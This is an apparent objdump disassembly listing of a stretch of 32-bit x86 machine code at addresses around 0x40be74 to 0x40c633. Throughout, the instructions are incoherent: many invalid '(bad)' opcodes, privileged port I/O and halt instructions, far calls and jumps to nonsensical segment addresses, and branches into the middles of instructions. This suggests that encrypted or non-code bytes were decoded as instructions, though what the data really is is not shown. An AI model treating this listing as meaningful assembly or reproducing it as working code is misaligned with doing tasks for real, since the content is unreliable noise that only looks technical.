  40be74:	data16 xlat BYTE PTR ds:[ebx]
  40be76:	xchg   ecx,eax
  40be77:	dec    edx
  40be78:	and    DWORD PTR [ebx],ebx
  40be7a:	pop    ss
  40be7b:	adc    DWORD PTR ds:0x2119bebc,eax
  40be81:	jmp    FWORD PTR [edx+edi*1]
  40be84:	test   DWORD PTR [ecx-0x29],edi
  40be87:	fwait
  40be88:	mov    ds:0x956e3132,eax
  40be8d:	retf   0x327c
  40be90:	mov    esi,0xc6e6ff63
  40be95:	push   eax
  40be96:	mov    ds:0x83fc5c16,al
  40be9b:	xchg   esi,eax
  40be9c:	ds leave 
  40be9e:	outs   dx,BYTE PTR ds:[esi]
  40be9f:	es dec ebp
  40bea1:	(bad)  [edx+0x6c65df32]
  40bea7:	ins    BYTE PTR es:[edi],dx
  40bea8:	es adc al,0x8d
  40beab:	mov    al,ds:0xbf2ddcb8
  40beb0:	pop    eax
  40beb1:	inc    eax
  40beb2:	xor    edi,DWORD PTR [edx+0x3ca145e5]
  40beb8:	or     ch,BYTE PTR [ebp-0x30efd1bc]
  40bebe:	cmp    DWORD PTR [ebx],esi
  40bec0:	cmp    dl,BYTE PTR [esi+0x1f]
  40bec3:	das    
  40bec4:	jl     0x40bea5
  40bec6:	add    eax,ebx
  40bec8:	pop    es
  40bec9:	in     eax,dx
  40beca:	(bad)  
  40becb:	leave  
  40becc:	fistp  QWORD PTR [ecx+0x31]
  40becf:	mov    ah,0xaf
  40bed1:	mov    ds:0x8b9ba2fe,al
  40bed6:	add    dh,BYTE PTR [edi]
  40bed8:	lds    ecx,FWORD PTR [ebx]
  40beda:	inc    edi
  40bedb:	mov    edx,0xf033138
  40bee0:	dec    ebx
  40bee1:	sahf   
  40bee2:	imul   ebp,DWORD PTR ds:0x1de86e41,0x68385146
  40beec:	out    0xb9,al
  40beee:	adc    bh,BYTE PTR [ecx-0x42]
  40bef1:	js     0x40beae
  40bef3:	sar    edx,cl
  40bef5:	inc    edi
  40bef6:	ins    BYTE PTR es:[edi],dx
  40bef7:	fs push ebp
  40bef9:	mov    bh,0x7a
  40befb:	pusha  
  40befc:	test   eax,0xd845e865
  40bf01:	pop    edi
  40bf02:	jns    0x40bf39
  40bf04:	and    ch,BYTE PTR [ecx-0x52]
  40bf07:	pop    edx
  40bf08:	inc    edi
  40bf09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf0a:	lds    esp,FWORD PTR [esi+0x66]
  40bf0d:	mov    cl,0x42
  40bf0f:	add    BYTE PTR [eax],0x34
  40bf12:	dec    ebx
  40bf13:	shr    DWORD PTR [eax+0x22],1
  40bf16:	push   ebp
  40bf17:	(bad)  
  40bf18:	stc    
  40bf19:	jl     0x40bea2
  40bf1b:	add    eax,0xcf3e047b
  40bf20:	pop    ebx
  40bf21:	sbb    DWORD PTR [edx+0x2901e0ef],edx
  40bf27:	sub    al,0x36
  40bf29:	fwait
  40bf2a:	sub    al,0xef
  40bf2c:	enter  0x65,0x35
  40bf30:	jns    0x40bf18
  40bf32:	jmp    0xeafa:0xba1e2b84
  40bf39:	das    
  40bf3a:	or     ah,BYTE PTR [ebx-0x56c7beeb]
  40bf40:	enter  0x4bda,0x60
  40bf44:	dec    ebx
  40bf45:	add    al,BYTE PTR [esi]
  40bf47:	xchg   edi,eax
  40bf48:	pusha  
  40bf49:	or     BYTE PTR [ebx*1+0x4d2f8feb],al
  40bf50:	je     0x40bfa0
  40bf52:	out    0x4f,al
  40bf54:	jl     0x40bfa0
  40bf56:	dec    esi
  40bf57:	montmul 
  40bf5a:	outs   dx,BYTE PTR ds:[esi]
  40bf5b:	shr    BYTE PTR [esi+ebp*4-0x1e],0x52
  40bf60:	std    
  40bf61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf62:	(bad)  
  40bf63:	or     DWORD PTR [esi+0x56a63c68],eax
  40bf69:	mov    esp,0xa04fc6e8
  40bf6e:	in     eax,0x43
  40bf70:	xchg   ebp,eax
  40bf71:	aas    
  40bf72:	xchg   esi,eax
  40bf73:	ret    
  40bf74:	stos   DWORD PTR es:[edi],eax
  40bf75:	sti    
  40bf76:	cli    
  40bf77:	dec    eax
  40bf78:	in     eax,dx
  40bf79:	std    
  40bf7a:	pushf  
  40bf7b:	mov    ds,WORD PTR ds:0x5d7d847f
  40bf81:	dec    edi
  40bf82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf83:	popa   
  40bf84:	pushf  
  40bf85:	jb     0x40bf36
  40bf87:	push   esp
  40bf88:	cwde   
  40bf89:	push   ecx
  40bf8a:	pop    eax
  40bf8b:	cmp    cl,BYTE PTR [eax+ebx*4+0x4727b613]
  40bf92:	mov    ds:0xdf1f1816,eax
  40bf97:	outs   dx,DWORD PTR ds:[esi]
  40bf98:	or     ch,dl
  40bf9a:	mov    edx,0xa5d15cf6
  40bf9f:	xchg   ebx,eax
  40bfa0:	xchg   esi,eax
  40bfa1:	mov    al,0xf6
  40bfa3:	sub    ah,ch
  40bfa5:	test   al,0x26
  40bfa7:	mov    eax,ds:0x7c185c2a
  40bfac:	jge    0x40bf51
  40bfae:	mov    esp,0xdc16b836
  40bfb3:	jns    0x40bf90
  40bfb5:	pop    ebp
  40bfb6:	fdivr  QWORD PTR [esp+edx*4]
  40bfb9:	add    al,0x1b
  40bfbb:	enter  0x6e04,0x8f
  40bfbf:	push   ss
  40bfc0:	(bad)  
  40bfc2:	mov    cl,0x21
  40bfc4:	cmp    DWORD PTR [ecx+0x51b5dc25],edx
  40bfca:	int3   
  40bfcb:	sub    DWORD PTR ss:[esi+0x6f44de11],ecx
  40bfd2:	mov    bl,0x56
  40bfd4:	fcom   QWORD PTR [ebx+eiz*8-0x19]
  40bfd8:	ret    
  40bfd9:	test   DWORD PTR [eax+edi*1-0x26bf4729],esp
  40bfe0:	out    dx,al
  40bfe1:	pop    ecx
  40bfe2:	shl    BYTE PTR [ecx+0x51],0x8c
  40bfe6:	loop   0x40c00b
  40bfe8:	inc    ecx
  40bfe9:	mul    BYTE PTR [esi-0x52]
  40bfec:	sub    ah,ah
  40bfee:	push   eax
  40bfef:	xor    BYTE PTR [edi+ebp*2],dh
  40bff2:	mov    ds:0xd48b6a41,eax
  40bff7:	cmp    cl,bh
  40bff9:	fidivr DWORD PTR [ecx+0x7cff12ce]
  40bfff:	sub    al,0xe4
  40c001:	push   esi
  40c002:	cmp    DWORD PTR [esi],edi
  40c004:	cmp    dh,BYTE PTR [edx]
  40c006:	retf   0x5e61
  40c009:	cld    
  40c00a:	inc    BYTE PTR [eax-0x7ec974c3]
  40c010:	sbb    ah,dh
  40c012:	loope  0x40bfdc
  40c014:	mov    ds:0x7b266635,eax
  40c019:	sub    eax,0x210339d0
  40c01e:	lahf   
  40c01f:	jae    0x40bfcb
  40c021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c022:	push   esi
  40c023:	out    0x2a,eax
  40c025:	bound  esp,QWORD PTR [esp+edx*8]
  40c028:	inc    edi
  40c029:	hlt    
  40c02a:	dec    edx
  40c02b:	cmp    bh,BYTE PTR ds:0x7fb08df3
  40c031:	repz dec eax
  40c033:	cwde   
  40c034:	adc    ebp,edx
  40c036:	cwde   
  40c037:	pusha  
  40c038:	fcomp  DWORD PTR [edi+0x48f5a2fc]
  40c03e:	sbb    al,0xc8
  40c040:	jl     0x40c068
  40c042:	retf   
  40c043:	push   esi
  40c044:	xchg   ecx,eax
  40c045:	pop    ds
  40c046:	pop    ecx
  40c047:	iret   
  40c048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c049:	sti    
  40c04a:	fidivr DWORD PTR [edx+eiz*4]
  40c04d:	mov    ebp,0x1a7def5d
  40c052:	inc    eax
  40c053:	jbe    0x40c0bb
  40c055:	in     eax,0x1a
  40c057:	(bad)  [esi]
  40c059:	mov    eax,0x3a05876e
  40c05e:	push   esp
  40c05f:	lods   eax,DWORD PTR ds:[esi]
  40c060:	mov    al,0xbc
  40c062:	mov    bh,0x32
  40c064:	xchg   DWORD PTR [ebx+0x1eb00e2f],edx
  40c06a:	xor    edx,0x7c
  40c06d:	test   esi,ecx
  40c06f:	pop    ds
  40c070:	sbb    esi,DWORD PTR [ebx]
  40c072:	adc    al,al
  40c074:	and    BYTE PTR [ebx+0x6601d20c],bh
  40c07a:	fcmovnbe st,st(5)
  40c07c:	dec    ebp
  40c07d:	std    
  40c07e:	into   
  40c07f:	ss dec edi
  40c081:	arpl   WORD PTR [edi+ebp*2],ax
  40c084:	lea    edx,[edx+0x72]
  40c087:	call   0xc645:0xe6a896da
  40c08e:	or     edx,DWORD PTR [ecx+ecx*8+0x23]
  40c092:	or     eax,DWORD PTR [edi]
  40c094:	aam    0xa
  40c096:	nop
  40c097:	out    0xa8,eax
  40c099:	xchg   ebp,eax
  40c09a:	mov    eax,ds:0x34c6dc59
  40c09f:	(bad)  
  40c0a1:	fiadd  WORD PTR ds:0x61a94998
  40c0a7:	(bad)
  40c0ab:	aam    0x7
  40c0ad:	xor    eax,0xdfa145bd
  40c0b2:	adc    DWORD PTR [edi-0x458e9536],ecx
  40c0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0b9:	fnstenv [ebx]
  40c0bb:	cmp    BYTE PTR [ecx],ah
  40c0bd:	add    bh,BYTE PTR es:[ebp-0x469c4b2f]
  40c0c4:	push   edx
  40c0c5:	imul   ebp,DWORD PTR [ebx],0x7c
  40c0c8:	fadd   QWORD PTR [edi]
  40c0ca:	adc    BYTE PTR [eax-0x3a6992f],0x4f
  40c0d1:	add    eax,0xbff31240
  40c0d6:	in     eax,0xdc
  40c0d8:	outs   dx,DWORD PTR ds:[esi]
  40c0d9:	inc    ebp
  40c0da:	call   0x704b:0xfe9fed84
  40c0e1:	rol    DWORD PTR [ecx+0x74],cl
  40c0e4:	xchg   esi,eax
  40c0e5:	inc    DWORD PTR [edx-0x54]
  40c0e8:	jbe    0x40c127
  40c0ea:	dec    edi
  40c0eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0ec:	and    DWORD PTR [edi+0x79],0x7e
  40c0f0:	sbb    dl,BYTE PTR [eax+0x7736fb31]
  40c0f6:	outs   dx,BYTE PTR ds:[esi]
  40c0f7:	mov    dh,0x45
  40c0f9:	iret   
  40c0fa:	pop    es
  40c0fb:	test   edi,ebp
  40c0fd:	aad    0x44
  40c0ff:	ret    
  40c100:	(bad)  
  40c101:	push   DWORD PTR [edi]
  40c103:	lods   al,BYTE PTR ds:[esi]
  40c104:	shr    DWORD PTR [ebp-0x7b],0x44
  40c108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c109:	jae    0x40c0ab
  40c10b:	inc    esp
  40c10c:	out    0xd1,eax
  40c10e:	cmp    cl,dl
  40c110:	fidivr DWORD PTR [ebx]
  40c112:	lods   al,BYTE PTR ds:[esi]
  40c113:	mov    ch,0x47
  40c115:	stos   BYTE PTR es:[edi],al
  40c116:	out    0x21,eax
  40c118:	(bad)  
  40c119:	fsubr  DWORD PTR [edi+0x3ab29d25]
  40c11f:	pop    es
  40c120:	dec    ebx
  40c121:	rol    BYTE PTR [edx+0xc9f486],1
  40c127:	leave  
  40c128:	aas    
  40c129:	fwait
  40c12a:	ja     0x40c0b1
  40c12c:	scas   eax,DWORD PTR es:[edi]
  40c12d:	xchg   ebx,eax
  40c12e:	popf   
  40c12f:	(bad)  
  40c130:	and    eax,0xeab811bb
  40c135:	lahf   
  40c136:	repz loop 0x40c0c3
  40c139:	sti    
  40c13a:	clc    
  40c13b:	aaa    
  40c13c:	jg     0x40c118
  40c13e:	outs   dx,DWORD PTR ds:[esi]
  40c13f:	mov    ah,0x8d
  40c142:	les    esi,FWORD PTR [edi+0x7198a4b]
  40c148:	fstp   DWORD PTR [ebp-0x17]
  40c14b:	test   eax,0x299d7933
  40c150:	dec    ebx
  40c151:	adc    bh,al
  40c153:	out    0xbb,eax
  40c155:	mov    ch,0x3e
  40c157:	push   0x41a7c8e9
  40c15c:	stos   BYTE PTR es:[edi],al
  40c15d:	mov    ebp,0xf6af100
  40c162:	cmp    BYTE PTR [edx+edi*2],bh
  40c165:	out    dx,eax
  40c166:	scas   eax,DWORD PTR es:[edi]
  40c167:	and    ax,0x4cf6
  40c16b:	loope  0x40c180
  40c16d:	xor    DWORD PTR [ebp-0x681f3235],ebp
  40c173:	(bad)  
  40c174:	lahf   
  40c175:	das    
  40c176:	push   0xfffffffb
  40c178:	out    dx,al
  40c179:	div    DWORD PTR [ecx+0x5e60b9eb]
  40c17f:	xchg   esp,edi
  40c181:	jge    0x40c1fb
  40c183:	inc    eax
  40c184:	outs   dx,DWORD PTR ds:[esi]
  40c185:	ss and al,0x70
  40c188:	dec    ebx
  40c189:	mov    ds:0x6290a9a3,al
  40c18e:	fdiv   QWORD PTR [ecx+edx*1-0x16]
  40c192:	mov    eax,0x4ef34989
  40c197:	dec    edx
  40c198:	popf   
  40c199:	dec    esp
  40c19a:	or     DWORD PTR [esi+eax*1+0x44],0x37ac312
  40c1a2:	imul   eax,DWORD PTR [edx-0x49],0xffffff91
  40c1a6:	js     0x40c1d9
  40c1a8:	scas   eax,DWORD PTR es:[edi]
  40c1a9:	mov    al,0xbb
  40c1ab:	cmc    
  40c1ac:	mov    bh,0xf8
  40c1ae:	push   eax
  40c1af:	(bad)  
  40c1b0:	out    0xd6,al
  40c1b2:	rcr    DWORD PTR [ecx+0x55],cl
  40c1b5:	xor    DWORD PTR [edi-0x4d86d8b2],esi
  40c1bb:	jle    0x719d8074
  40c1c1:	mov    DWORD PTR ds:0xa4799969,edx
  40c1c7:	mov    ecx,esi
  40c1c9:	mov    ebx,0xd4ec6e7
  40c1ce:	push   esp
  40c1cf:	xor    cl,BYTE PTR [edi]
  40c1d1:	loop   0x40c1f5
  40c1d3:	cli    
  40c1d4:	(bad)  [ebp+0x42]
  40c1d7:	les    esi,FWORD PTR [eax-0x1c]
  40c1da:	ret    
  40c1db:	xchg   BYTE PTR [ebp-0x14],dh
  40c1de:	imul   eax,DWORD PTR [edx-0x7c],0x34ba39da
  40c1e5:	sahf   
  40c1e6:	or     ecx,DWORD PTR [ecx-0x8f795fa]
  40c1ec:	sbb    BYTE PTR [ebp-0x1fb9d360],bh
  40c1f2:	inc    ebx
  40c1f3:	sub    eax,0x7a355f27
  40c1f8:	dec    ecx
  40c1f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1fa:	call   0x6d54a935
  40c1ff:	xor    BYTE PTR [edi+0xcc2b7b2],bl
  40c205:	int3   
  40c206:	sbb    esp,edx
  40c208:	call   0x2c99fd6b
  40c20d:	mov    fs,WORD PTR [esi]
  40c20f:	repz jp 0x40c1df
  40c212:	or     esi,DWORD PTR [ebx-0x5d66b2a0]
  40c218:	add    eax,0x7de21e6
  40c21d:	sbb    dl,BYTE PTR [edi-0x364c6d58]
  40c223:	fistp  QWORD PTR [edi-0x270dbe9e]
  40c229:	xchg   DWORD PTR [esp+eax*4+0x34af39c2],esp
  40c230:	inc    ecx
  40c231:	je     0x40c1ba
  40c233:	fcmovnu st,st(6)
  40c235:	(bad)  
  40c236:	ja     0x40c244
  40c238:	adc    DWORD PTR [edx+eax*8-0xf],esp
  40c23c:	or     BYTE PTR [ecx+0x12],ch
  40c23f:	push   es
  40c240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c241:	dec    eax
  40c242:	stos   DWORD PTR es:[edi],eax
  40c243:	loopne 0x40c210
  40c245:	push   edx
  40c246:	ret    
  40c247:	repz mov edi,DWORD PTR [edi+0x232652b8]
  40c24e:	jmp    0x32969896
  40c253:	scas   al,BYTE PTR es:[edi]
  40c254:	jbe    0x40c1e7
  40c256:	cld    
  40c257:	jmp    0xef66230a
  40c25c:	into   
  40c25d:	pop    edi
  40c25e:	sti    
  40c25f:	addr16 jbe 0x40c224
  40c262:	fdivr  st,st(2)
  40c264:	call   0x49ef:0xc19b778b
  40c26b:	mov    bl,0x3a
  40c26d:	(bad)  
  40c26e:	jmp    0x8f2d7849
  40c273:	retf   
  40c274:	lea    edi,[ebx-0x28fad16b]
  40c27a:	dec    esi
  40c27b:	fisubr WORD PTR [ebp-0x78176030]
  40c281:	mov    DWORD PTR [edi+ebp*1+0x7e],0x9a74fce8
  40c289:	iret   
  40c28a:	cmp    bl,BYTE PTR [esi]
  40c28c:	mov    bl,0x25
  40c28e:	loop   0x40c2d9
  40c290:	mov    bl,0x71
  40c292:	mov    ebp,cs
  40c294:	jmp    0x40c29e
  40c296:	xchg   BYTE PTR [edx+0x6b],bl
  40c299:	fadd   st,st(2)
  40c29b:	inc    edx
  40c29c:	inc    ebp
  40c29d:	xchg   BYTE PTR [ecx],ch
  40c29f:	pop    ds
  40c2a0:	fwait
  40c2a1:	or     BYTE PTR [ebx+0x19731215],cl
  40c2a7:	pop    ecx
  40c2a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2a9:	ss rcr cl,cl
  40c2ac:	adc    eax,0xe02f1328
  40c2b1:	cdq    
  40c2b2:	adc    BYTE PTR ds:0xde2cbb22,ch
  40c2b8:	inc    ebx
  40c2b9:	xor    al,0x4a
  40c2bb:	push   ds
  40c2bc:	jge    0x40c2cb
  40c2be:	inc    eax
  40c2bf:	cmp    ch,al
  40c2c1:	sub    eax,0x2ca81ad9
  40c2c6:	cdq    
  40c2c7:	xchg   ebx,eax
  40c2c8:	xlat   BYTE PTR ds:[ebx]
  40c2c9:	sub    eax,0xdf6ab5b
  40c2ce:	push   edx
  40c2cf:	lods   eax,DWORD PTR ds:[esi]
  40c2d0:	(bad)  
  40c2d1:	(bad)  
  40c2d2:	lock mov eax,ds:0xb3585480
  40c2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2d9:	jmp    0x40c336
  40c2db:	inc    eax
  40c2dc:	jecxz  0x40c2a8
  40c2de:	sbb    ecx,edi
  40c2e0:	(bad)  
  40c2e1:	sub    BYTE PTR [ebx],ah
  40c2e3:	jbe    0x40c308
  40c2e5:	add    ecx,ebp
  40c2e7:	jg     0x40c353
  40c2e9:	mov    bl,0xb9
  40c2eb:	aam    0x6e
  40c2ed:	in     al,0x41
  40c2ef:	in     eax,dx
  40c2f0:	sar    BYTE PTR [esi],1
  40c2f2:	out    dx,eax
  40c2f3:	mov    bl,BYTE PTR [esi]
  40c2f5:	scas   eax,DWORD PTR es:[edi]
  40c2f6:	lea    edi,[edx+0x78bcda6c]
  40c2fc:	push   cs
  40c2fd:	cmc    
  40c2fe:	sub    dh,BYTE PTR [esi-0x25]
  40c301:	push   ss
  40c302:	adc    esi,DWORD PTR [ecx-0x4e]
  40c305:	push   ebx
  40c306:	loop   0x40c2ef
  40c308:	and    edx,esp
  40c30a:	cmp    BYTE PTR [esi+0x4],ah
  40c30d:	dec    ecx
  40c30e:	mov    eax,ds:0x9556d7d
  40c313:	mov    bl,0xdc
  40c315:	mov    bh,0x16
  40c317:	push   es
  40c318:	jnp    0x40c355
  40c31a:	pop    ebp
  40c31b:	arpl   WORD PTR [eax+0x7285d92b],di
  40c321:	daa    
  40c322:	mov    eax,ds:0x32e3ba83
  40c327:	mov    WORD PTR [ecx-0x22400fe5],?
  40c32d:	cmp    dh,cl
  40c32f:	test   DWORD PTR [edx-0x70d60fd6],0x425c9d02
  40c339:	xchg   ebx,eax
  40c33a:	mov    bh,0xe
  40c33c:	add    edx,esp
  40c33e:	mov    eax,ds:0xe63b01aa
  40c343:	jb     0x40c2d0
  40c345:	not    DWORD PTR [ebp+0x30]
  40c348:	mov    WORD PTR [edx],?
  40c34a:	mov    ds:0xd5a39d9,eax
  40c34f:	adc    al,0x5b
  40c351:	add    al,0xe1
  40c353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c354:	inc    esp
  40c355:	adc    BYTE PTR [eax+ebx*4-0x8],0x23
  40c35a:	inc    esi
  40c35b:	mov    bl,0xbf
  40c35d:	jge    0x40c3a2
  40c35f:	lods   al,BYTE PTR ds:[esi]
  40c360:	mov    ah,0x81
  40c362:	adc    BYTE PTR [ecx-0x52],dl
  40c365:	data16 into 
  40c367:	mov    dh,0x87
  40c369:	loope  0x40c3b5
  40c36b:	stos   BYTE PTR es:[edi],al
  40c36c:	retf   0x5d8e
  40c36f:	daa    
  40c370:	add    BYTE PTR [eax+0x7243a554],ch
  40c376:	sbb    BYTE PTR [edx-0x55938cd0],bh
  40c37c:	rcr    BYTE PTR [edx+0x39],0xe9
  40c380:	jg     0x40c3c8
  40c382:	pop    ebx
  40c383:	daa    
  40c384:	dec    ecx
  40c385:	pop    ss
  40c386:	pushf  
  40c387:	push   ebx
  40c388:	imul   esp,ecx,0x4e
  40c38b:	je     0x40c329
  40c38d:	push   ds
  40c38e:	jl     0x40c376
  40c390:	inc    ebp
  40c391:	pop    eax
  40c392:	add    ch,BYTE PTR [ebp-0x3fe9d533]
  40c398:	push   esp
  40c399:	int3   
  40c39a:	push   eax
  40c39b:	fs cmp al,0x6
  40c39e:	leave  
  40c39f:	inc    ebx
  40c3a0:	aas    
  40c3a1:	stos   BYTE PTR es:[edi],al
  40c3a2:	push   ebx
  40c3a3:	xchg   DWORD PTR [edi-0x18ce6152],esi
  40c3a9:	rcl    DWORD PTR [ebx-0x75],cl
  40c3ac:	jp     0x40c34f
  40c3ae:	push   esi
  40c3af:	fadd   st,st(3)
  40c3b1:	mov    esp,0x733a8ae5
  40c3b6:	mov    esi,0xc70cc424
  40c3bb:	push   esi
  40c3bc:	xchg   ebp,eax
  40c3bd:	gs (bad) 
  40c3bf:	jg     0x40c3db
  40c3c1:	mov    ebx,0xee507ce1
  40c3c6:	outs   dx,BYTE PTR ds:[esi]
  40c3c7:	mov    al,0x5d
  40c3c9:	scas   al,BYTE PTR es:[edi]
  40c3ca:	add    al,0x9d
  40c3cc:	cwde   
  40c3cd:	icebp  
  40c3ce:	push   edi
  40c3cf:	xor    DWORD PTR [edx+0x33],esp
  40c3d2:	dec    edi
  40c3d3:	push   esp
  40c3d4:	pusha  
  40c3d5:	cld    
  40c3d6:	and    bh,BYTE PTR [esi+ebx*4-0xe]
  40c3da:	jp     0x40c360
  40c3dc:	fstp   DWORD PTR [esi+0x2180a966]
  40c3e2:	add    al,0x42
  40c3e4:	scas   eax,DWORD PTR es:[edi]
  40c3e5:	push   edx
  40c3e6:	call   0x47c8:0xc42bc4f8
  40c3ed:	stc    
  40c3ee:	jmp    0x40c458
  40c3f0:	cmc    
  40c3f1:	xchg   ebx,eax
  40c3f2:	fist   WORD PTR [bp+di-0x27ca]
  40c3f7:	mov    dl,0x89
  40c3f9:	jle    0x40c457
  40c3fb:	lahf   
  40c3fc:	xor    cl,BYTE PTR [ecx+0x34]
  40c3ff:	gs jp  0x40c3f8
  40c402:	xor    BYTE PTR [edi],dl
  40c404:	ret    0x505a
  40c407:	pop    esp
  40c408:	push   ds
  40c409:	adc    eax,0x50e9ca59
  40c40e:	pop    esi
  40c40f:	cwde   
  40c410:	sub    ecx,DWORD PTR [ebp+0x6aa681e]
  40c416:	out    0x72,eax
  40c418:	xchg   ebp,eax
  40c419:	icebp  
  40c41a:	fs mov ch,0x94
  40c41d:	nop
  40c41e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c41f:	fiadd  WORD PTR [ecx-0x7d5daeb4]
  40c425:	or     ch,cl
  40c427:	inc    ebp
  40c428:	clc    
  40c429:	pop    edi
  40c42a:	std    
  40c42b:	mov    edx,edx
  40c42d:	jmp    0x40c40e
  40c42f:	pop    es
  40c430:	(bad)  [ecx]
  40c432:	jmp    0x3fa8:0xbb8a2b65
  40c439:	loopne 0x40c427
  40c43b:	cmp    BYTE PTR [ebx+0x47783f75],bl
  40c441:	xchg   esi,ecx
  40c443:	ficomp DWORD PTR [ebp+0x133c52a3]
  40c449:	and    BYTE PTR es:[ecx],al
  40c44c:	jg     0x40c445
  40c44e:	(bad)  
  40c44f:	stc    
  40c450:	jge    0x40c3d7
  40c452:	(bad)  
  40c453:	lods   al,BYTE PTR ds:[esi]
  40c454:	call   0x8992933a
  40c459:	inc    eax
  40c45a:	retf   0x9b92
  40c45d:	imul   ecx,DWORD PTR [eax],0x13
  40c460:	enter  0x8d77,0x97
  40c464:	stos   BYTE PTR es:[edi],al
  40c465:	std    
  40c466:	jae    0x40c455
  40c468:	xchg   BYTE PTR [esi],dl
  40c46a:	(bad)
  40c46e:	clc    
  40c46f:	inc    si
  40c471:	inc    ebp
  40c472:	jnp    0x40c4b0
  40c474:	test   DWORD PTR [esi-0xc],esi
  40c477:	fnstcw WORD PTR [edi-0x8]
  40c47a:	xor    BYTE PTR [eax],ah
  40c47c:	pushf  
  40c47d:	add    bl,dl
  40c47f:	push   ebx
  40c480:	lds    ebp,FWORD PTR [esi+0x54120d10]
  40c486:	jb     0x40c441
  40c488:	jg     0x40c41e
  40c48a:	popf   
  40c48b:	(bad)  
  40c48c:	mov    al,ds:0x21801057
  40c491:	clc    
  40c492:	(bad)  
  40c493:	sbb    BYTE PTR ds:0xa031c4ca,bl
  40c499:	cwde   
	...
  40c512:	add    BYTE PTR [eax],al
  40c514:	es ss pop ecx
  40c517:	sbb    BYTE PTR [ecx+0x7f],bl
  40c51a:	addr16 ds loope 0x40c540
  40c51e:	dec    edx
  40c51f:	inc    esp
  40c520:	jnp    0x40c522
  40c522:	jmp    0x40c55d
  40c524:	adc    DWORD PTR [ebp+0x0],esi
  40c527:	add    BYTE PTR [esi+0x7],ch
  40c52a:	add    BYTE PTR [eax],al
  40c52c:	fstp   QWORD PTR [ecx+0x365f1dbf]
  40c532:	stos   DWORD PTR es:[edi],eax
  40c533:	aad    0x9f
  40c535:	mov    WORD PTR ds:0xf3c24c69,cs
  40c53b:	cdq    
  40c53c:	call   0xdd8f:0xb6c198c9
  40c543:	and    DWORD PTR [edx+ecx*2+0xa],esi
  40c547:	pop    esi
  40c548:	pop    eax
  40c549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c54a:	push   0x4d4a2c68
  40c54f:	clc    
  40c550:	cmc    
  40c551:	add    DWORD PTR [edx],ebx
  40c553:	lods   eax,DWORD PTR ds:[esi]
  40c554:	and    eax,0xae9c1417
  40c559:	pushf  
  40c55a:	add    ch,BYTE PTR [ebp+0x16476784]
  40c560:	mov    ch,BYTE PTR [edi+0x32]
  40c563:	pop    ebp
  40c564:	fdiv   QWORD PTR [ebp-0x70]
  40c567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c568:	(bad)
  40c56b:	jl     0x40c5bd
  40c56d:	cmovb  edi,DWORD PTR [eax+0xb]
  40c571:	push   cs
  40c572:	jmp    0x5dcfd2cc
  40c577:	adc    al,0x69
  40c579:	jb     0x40c5cf
  40c57b:	sbb    BYTE PTR [esi+0x47a328f0],ah
  40c581:	sub    eax,0xff2e70d
  40c586:	jmp    0x41a9a3fc
  40c58b:	xor    DWORD PTR [ebx+0xb],0xffffffc5
  40c58f:	mov    al,ds:0x8e03b659
  40c594:	pop    eax
  40c595:	sub    eax,0x1f109827
  40c59a:	xlat   BYTE PTR ds:[ebx]
  40c59b:	dec    esp
  40c59c:	js     0x40c525
  40c59e:	jae    0x40c562
  40c5a0:	push   0x5a504195
  40c5a5:	or     DWORD PTR [edx+0x61b2391c],eax
  40c5ab:	outs   dx,BYTE PTR ds:[esi]
  40c5ac:	pop    es
  40c5ad:	fst    DWORD PTR [eax]
  40c5af:	lahf   
  40c5b0:	pushf  
  40c5b1:	cmp    eax,0x3b4f74da
  40c5b6:	add    eax,0xac97e9b9
  40c5bb:	pop    ss
  40c5bc:	xchg   esp,eax
  40c5bd:	xchg   esi,eax
  40c5be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5bf:	xlat   BYTE PTR ds:[ebx]
  40c5c0:	sbb    ecx,esp
  40c5c2:	cmp    BYTE PTR [ebx+0x2d29c989],0xfe
  40c5c9:	ret    0x571c
  40c5cc:	mov    ah,0xdb
  40c5ce:	jp     0x40c5ac
  40c5d0:	xor    al,0x67
  40c5d2:	pop    ebp
  40c5d3:	cmp    eax,0x2554ef56
  40c5d8:	inc    eax
  40c5d9:	push   ss
  40c5da:	in     al,dx
  40c5db:	mov    DWORD PTR [eax+edi*1-0x1c],0xc604f861
  40c5e3:	rol    BYTE PTR [edi],cl
  40c5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e6:	jbe    0x40c65b
  40c5e8:	mov    ebp,0x29a00954
  40c5ed:	mov    bh,0xfd
  40c5ef:	inc    ecx
  40c5f0:	xchg   edx,eax
  40c5f1:	jle    0x40c622
  40c5f3:	adc    BYTE PTR [edx+0x56],al
  40c5f6:	retf   0xd0ce
  40c5f9:	in     al,dx
  40c5fa:	fdiv   st,st(0)
  40c5fc:	call   0xedb5:0xc3b1e791
  40c603:	into   
  40c604:	loope  0x40c5b4
  40c606:	xor    BYTE PTR [ecx-0x7054b025],bh
  40c60c:	lds    edx,FWORD PTR [ebx-0x1b90b9cb]
  40c612:	mov    edi,edi
  40c614:	mov    al,ds:0xf11d6f55
  40c619:	xchg   esi,eax
  40c61a:	xor    ebp,ebx
  40c61c:	jl     0x40c60c
  40c61e:	(bad)  
  40c61f:	xchg   DWORD PTR [edx],eax
  40c621:	xchg   ebx,eax
  40c622:	gs popa 
  40c624:	fmulp  st(1),st
  40c626:	xor    bl,BYTE PTR [edi-0x5b]
  40c629:	jecxz  0x40c643
  40c62b:	out    dx,al
  40c62c:	lahf   
  40c62d:	adc    bh,0x2f
  40c630:	sbb    DWORD PTR [ebx+esi*2],edx
  40c633:	lds    ecx,FWORD PTR [ebx+0x2dd29891]
